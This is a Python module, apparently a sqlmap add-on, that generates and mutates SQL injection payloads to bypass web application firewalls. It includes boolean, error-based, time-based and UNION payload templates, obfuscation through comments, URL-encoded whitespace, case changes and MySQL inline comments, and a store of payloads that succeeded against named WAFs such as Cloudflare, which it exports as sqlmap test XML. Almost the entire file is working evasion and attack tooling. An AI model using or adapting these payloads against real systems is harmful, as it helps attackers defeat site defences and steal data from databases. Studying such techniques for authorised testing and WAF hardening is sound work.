#!/usr/bin/env python

"""
Copyright (c) 2025 Aya Elbadry (@Aya-Elbadry)
AI-Powered Payload Generator for WAF Bypass
This module uses AI/ML to generate and evolve SQL injection payloads
"""

from __future__ import print_function

import os
import json
import random
import re
import hashlib
from datetime import datetime
from collections import defaultdict

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.cluster import KMeans
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False

class AIPayloadGenerator:
    """
    AI-Powered Payload Generator that learns from successful payloads
    and generates new, improved payloads for WAF bypass
    """
    
    def __init__(self, payloads_file=None, learning_db=None):
        self.payloads_file = payloads_file or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
            "data", "xml", "payloads", "new_payloads.xml"
        )
        
        self.learning_db = learning_db or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
            "data", "ai_learning_db.json"
        )
        
        self.successful_payloads = []
        self.failed_payloads = []
        self.waf_patterns = {}
        self.evolution_history = []
        
        self._load_learning_data()
    
    def _load_learning_data(self):
        """Load learning data from database"""
        if os.path.exists(self.learning_db):
            try:
                with open(self.learning_db, 'r') as f:
                    data = json.load(f)
                    self.successful_payloads = data.get('successful', [])
                    self.failed_payloads = data.get('failed', [])
                    self.waf_patterns = data.get('waf_patterns', {})
                    self.evolution_history = data.get('evolution_history', [])
            except Exception as e:
                print(f"[!] Error loading learning data: {e}")
    
    def _save_learning_data(self):
        """Save learning data to database"""
        try:
            data = {
                'successful': self.successful_payloads[-1000:],  # Keep last 1000
                'failed': self.failed_payloads[-500:],  # Keep last 500
                'waf_patterns': self.waf_patterns,
                'evolution_history': self.evolution_history[-100:],  # Keep last 100
                'last_updated': datetime.now().isoformat()
            }
            
            os.makedirs(os.path.dirname(self.learning_db), exist_ok=True)
            with open(self.learning_db, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"[!] Error saving learning data: {e}")
    
    def record_success(self, payload, waf_type=None, context=None):
        """Record a successful payload"""
        entry = {
            'payload': payload,
            'waf_type': waf_type,
            'context': context,
            'timestamp': datetime.now().isoformat(),
            'hash': hashlib.md5(payload.encode()).hexdigest()
        }
        
        # Avoid duplicates
        if entry['hash'] not in [p['hash'] for p in self.successful_payloads]:
            self.successful_payloads.append(entry)
            
            # Update WAF patterns
            if waf_type:
                if waf_type not in self.waf_patterns:
                    self.waf_patterns[waf_type] = {
                        'successful_patterns': [],
                        'count': 0
                    }
                self.waf_patterns[waf_type]['count'] += 1
                self.waf_patterns[waf_type]['successful_patterns'].append({
                    'payload': payload,
                    'timestamp': entry['timestamp']
                })
            
            self._save_learning_data()
    
    def record_failure(self, payload, reason=None, waf_type=None):
        """Record a failed payload"""
        entry = {
            'payload': payload,
            'reason': reason,
            'waf_type': waf_type,
            'timestamp': datetime.now().isoformat(),
            'hash': hashlib.md5(payload.encode()).hexdigest()
        }
        
        if entry['hash'] not in [p['hash'] for p in self.failed_payloads]:
            self.failed_payloads.append(entry)
            self._save_learning_data()
    
    def analyze_patterns(self):
        """Analyze patterns from successful payloads"""
        patterns = {
            'common_obfuscations': defaultdict(int),
            'common_structures': defaultdict(int),
            'waf_specific': defaultdict(list)
        }
        
        for payload_entry in self.successful_payloads:
            payload = payload_entry['payload']
            waf_type = payload_entry.get('waf_type')
            
            # Analyze obfuscation techniques
            if '/**/' in payload:
                patterns['common_obfuscations']['comment'] += 1
            if '%09' in payload or '%0A' in payload:
                patterns['common_obfuscations']['space_encoding'] += 1
            if '/*!' in payload:
                patterns['common_obfuscations']['inline_comment'] += 1
            if payload.lower() != payload:
                patterns['common_obfuscations']['case_variation'] += 1
            
            # Analyze structure
            if 'AND' in payload.upper():
                patterns['common_structures']['and_based'] += 1
            if 'UNION' in payload.upper():
                patterns['common_structures']['union_based'] += 1
            if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                patterns['common_structures']['time_based'] += 1
            
            # WAF-specific patterns
            if waf_type:
                patterns['waf_specific'][waf_type].append(payload)
        
        return patterns
    
    def generate_variant(self, base_payload, technique='mutation'):
        """Generate a variant of a payload using AI techniques"""
        variants = []
        
        # Technique 1: Obfuscation mutation
        if technique == 'mutation' or technique == 'all':
            # Add comment obfuscation
            variant = base_payload.replace(' AND ', '/**/AND/**/')
            if variant != base_payload:
                variants.append(variant)
            
            # Add space encoding
            variant = base_payload.replace(' ', '%09')
            if variant != base_payload:
                variants.append(variant)
            
            # Add newline encoding
            variant = base_payload.replace(' ', '%0A')
            if variant != base_payload:
                variants.append(variant)
            
            # Case variation
            variant = base_payload.replace('AND', 'aNd').replace('OR', 'oR')
            if variant != base_payload:
                variants.append(variant)
        
        # Technique 2: Structure evolution
        if technique == 'evolution' or technique == 'all':
            # Replace AND with nested functions
            if 'AND' in base_payload.upper():
                variant = base_payload.replace('AND', 'AND/**/SUBSTRING(CONCAT(1,1),1,1)')
                variants.append(variant)
            
            # Add inline comments
            if '=' in base_payload:
                variant = base_payload.replace('=', '/*!50000=*/')
                variants.append(variant)
        
        # Technique 3: Pattern learning
        if technique == 'learning' or technique == 'all':
            patterns = self.analyze_patterns()
            
            # Use successful patterns
            for waf_type, waf_data in patterns['waf_specific'].items():
                if waf_data:
                    # Extract common elements from successful payloads
                    for successful_payload in waf_data[:5]:  # Top 5
                        # Create hybrid payload
                        if 'AND' in base_payload.upper() and 'AND' in successful_payload.upper():
                            # Combine obfuscation techniques
                            parts = successful_payload.split('AND')
                            if len(parts) > 1:
                                variant = base_payload.split('AND')[0] + 'AND' + parts[1]
                                variants.append(variant)
        
        return list(set(variants))  # Remove duplicates
    
    def evolve_payload(self, base_payload, target_waf=None, generations=3):
        """Evolve a payload through multiple generations"""
        current_payload = base_payload
        evolution_path = [current_payload]
        
        for generation in range(generations):
            # Generate variants
            variants = self.generate_variant(current_payload, technique='all')
            
            if not variants:
                break
            
            # Select best variant (for now, random - in future, use ML model)
            if target_waf and target_waf in self.waf_patterns:
                # Prefer variants similar to successful ones for this WAF
                waf_successful = [p['payload'] for p in self.waf_patterns[target_waf]['successful_patterns']]
                scored_variants = []
                
                for variant in variants:
                    score = 0
                    for successful in waf_successful:
                        # Calculate similarity (simple version)
                        common_chars = sum(1 for a, b in zip(variant, successful) if a == b)
                        score += common_chars / max(len(variant), len(successful))
                    scored_variants.append((score, variant))
                
                if scored_variants:
                    scored_variants.sort(reverse=True)
                    current_payload = scored_variants[0][1]
                else:
                    current_payload = random.choice(variants)
            else:
                current_payload = random.choice(variants)
            
            evolution_path.append(current_payload)
        
        return current_payload, evolution_path
    
    def generate_new_payload(self, payload_type='boolean', target_waf=None):
        """Generate a completely new payload using AI"""
        base_templates = {
            'boolean': 'AND [RANDNUM]=[RANDNUM]',
            'error': 'AND EXTRACTVALUE([RANDNUM1],CONCAT(0x5c,0x717a6b7171,(SELECT/**/(CASE/**/WHEN/**/([INFERENCE])/**/THEN/**/1/**/ELSE/**/0/**/END)),0x717a707a71))',
            'time': 'AND/**/IF([INFERENCE],SLEEP([SLEEPTIME]),0)',
            'union': 'UNION/**/ALL/**/SELECT/**/[COLUMNS]'
        }
        
        base = base_templates.get(payload_type, base_templates['boolean'])
        
        # Evolve the base template
        evolved, path = self.evolve_payload(base, target_waf, generations=3)
        
        # Record evolution
        self.evolution_history.append({
            'base': base,
            'evolved': evolved,
            'path': path,
            'target_waf': target_waf,
            'timestamp': datetime.now().isoformat()
        })
        
        return evolved, path
    
    def get_recommendations(self, waf_type=None, payload_type=None):
        """Get AI recommendations based on learning"""
        recommendations = []
        
        # Get successful payloads for this WAF
        if waf_type and waf_type in self.waf_patterns:
            successful = self.waf_patterns[waf_type]['successful_patterns']
            if successful:
                recommendations.append({
                    'type': 'successful_pattern',
                    'payload': successful[-1]['payload'],
                    'confidence': 'high',
                    'reason': f'Recently successful against {waf_type}'
                })
        
        # Get patterns analysis
        patterns = self.analyze_patterns()
        
        # Recommend based on common successful obfuscations
        if patterns['common_obfuscations']:
            top_obfuscation = max(patterns['common_obfuscations'].items(), key=lambda x: x[1])
            recommendations.append({
                'type': 'obfuscation_technique',
                'technique': top_obfuscation[0],
                'confidence': 'medium',
                'reason': f'Used in {top_obfuscation[1]} successful payloads'
            })
        
        return recommendations
    
    def export_to_xml(self, output_file=None):
        """Export generated payloads to XML format compatible with sqlmap"""
        if not output_file:
            output_file = os.path.join(
                os.path.dirname(self.payloads_file),
                "ai_generated_payloads.xml"
            )
        
        # Get top successful payloads
        top_payloads = sorted(
            self.successful_payloads,
            key=lambda x: x.get('timestamp', ''),
            reverse=True
        )[:50]  # Top 50
        
        xml_content = '''<?xml version="1.0" encoding="UTF-8"?>

<!--
Copyright (c) 2025 Aya Elbadry (@Aya-Elbadry)
AI-Generated SQL Injection Payloads for WAF Bypass
Generated automatically based on learning from successful payloads
Last Updated: {timestamp}
-->

<root>
'''.format(timestamp=datetime.now().isoformat())
        
        for idx, payload_entry in enumerate(top_payloads, 1):
            payload = payload_entry['payload']
            waf_type = payload_entry.get('waf_type', 'Unknown')
            
            xml_content += f'''    <!-- AI-Generated Payload #{idx} - Successful against {waf_type} -->
    <test>
        <title>AI-Generated - {waf_type} Bypass</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>{payload}</vector>
        <request>
            <payload>{payload}</payload>
        </request>
        <response>
            <comparison>{payload.replace('[RANDNUM]', '[RANDNUM1]')}</comparison>
        </response>
    </test>

'''
        
        xml_content += '</root>'
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(xml_content)
            return output_file
        except Exception as e:
            print(f"[!] Error exporting to XML: {e}")
            return None

def main():
    """Main function for testing"""
    generator = AIPayloadGenerator()
    
    print("[*] AI Payload Generator initialized")
    print(f"[*] Loaded {len(generator.successful_payloads)} successful payloads")
    print(f"[*] Loaded {len(generator.failed_payloads)} failed payloads")
    
    # Generate a new payload
    print("\n[*] Generating new payload...")
    new_payload, path = generator.generate_new_payload('boolean', 'Cloudflare')
    print(f"[+] Generated: {new_payload}")
    print(f"[+] Evolution path: {path}")
    
    # Get recommendations
    print("\n[*] Getting recommendations...")
    recommendations = generator.get_recommendations('Cloudflare')
    for rec in recommendations:
        print(f"[+] {rec['type']}: {rec.get('payload', rec.get('technique', 'N/A'))}")
    
    # Export to XML
    print("\n[*] Exporting to XML...")
    output_file = generator.export_to_xml()
    if output_file:
        print(f"[+] Exported to: {output_file}")

if __name__ == '__main__':
    main()
